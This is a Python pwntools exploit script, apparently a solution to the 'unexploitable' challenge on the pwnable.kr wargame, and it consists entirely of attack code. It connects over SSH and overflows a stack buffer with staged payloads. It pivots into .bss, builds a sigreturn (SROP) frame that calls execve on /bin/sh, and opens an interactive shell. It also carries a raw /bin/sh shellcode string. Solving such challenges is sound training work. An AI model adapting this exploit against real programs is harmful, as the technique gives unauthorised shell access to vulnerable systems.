import struct, time
import pwn

HOST = 'pwnable.kr'
PORT = 2222
USER = 'unexploitable'
PASS = 'guest'

BINARY = '/home/unexploitable/unexploitable'
MAIN_ADDR = 0x400544
READ_ADDR = 0x40055B
SYSCALL_ADDR = 0x400560
BSS_ADDR = 0x601000

shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

pwn.context.clear(arch='amd64')

def main():
	
	frame = pwn.SigreturnFrame(kernel='amd64')
	frame.rax = 0x3b # sys_execve
	frame.rdi = BSS_ADDR + 0x200 + 8 * 8 + 248 # bin_sh addr on the payload
	# frame.rsp = SYSCALL_ADDR
	frame.rip = SYSCALL_ADDR

	print (len(str(frame)))

	bin_sh = '/bin/sh\x00'

	sys_addr = struct.pack("<Q", SYSCALL_ADDR)
	read_addr = struct.pack("<Q", READ_ADDR)
	new_rbp_1 = struct.pack("<Q", BSS_ADDR + 0x210)
	new_rbp_2 = struct.pack("<Q", BSS_ADDR + 0x230)
	syscall_payload_addr = struct.pack("<Q", BSS_ADDR + 0x230)

	payload_1 = ''
	payload_1 += 'A' * 16 # padding
	payload_1 += new_rbp_1
	payload_1 += read_addr
	
	payload_2 = ''
	payload_2 += 'A' * 16 # starting to write at [rbp-0x10]
	payload_2 += new_rbp_2
	payload_2 += read_addr
	payload_2 += 'B' * 16 # second writes here, junk values
	payload_2 += 'C' * 8 	# junk value, will be rbp
	payload_2 += sys_addr
	payload_2 += str(frame)
	payload_2 += bin_sh

	# last read, make rax = 0x0f
	payload_3 = 'D' * 15
	

	r = pwn.ssh(host=HOST,port=PORT,password=PASS,user=USER)
	p = r.process(BINARY)
	
	print ('[+] Process activated..')
	time.sleep(3.5)

	p.send(payload_1)
	print ('[+] First payload sent..')
	time.sleep(0.5)

	p.send(payload_2)
	print ('[+] Second payload sent..')
	time.sleep(0.5)

	# p.interactive()

	p.send(payload_3)
	print ('[+] Third payload sent..')
	time.sleep(0.5)

	p.interactive()
	
	return


if __name__ == '__main__':
	main()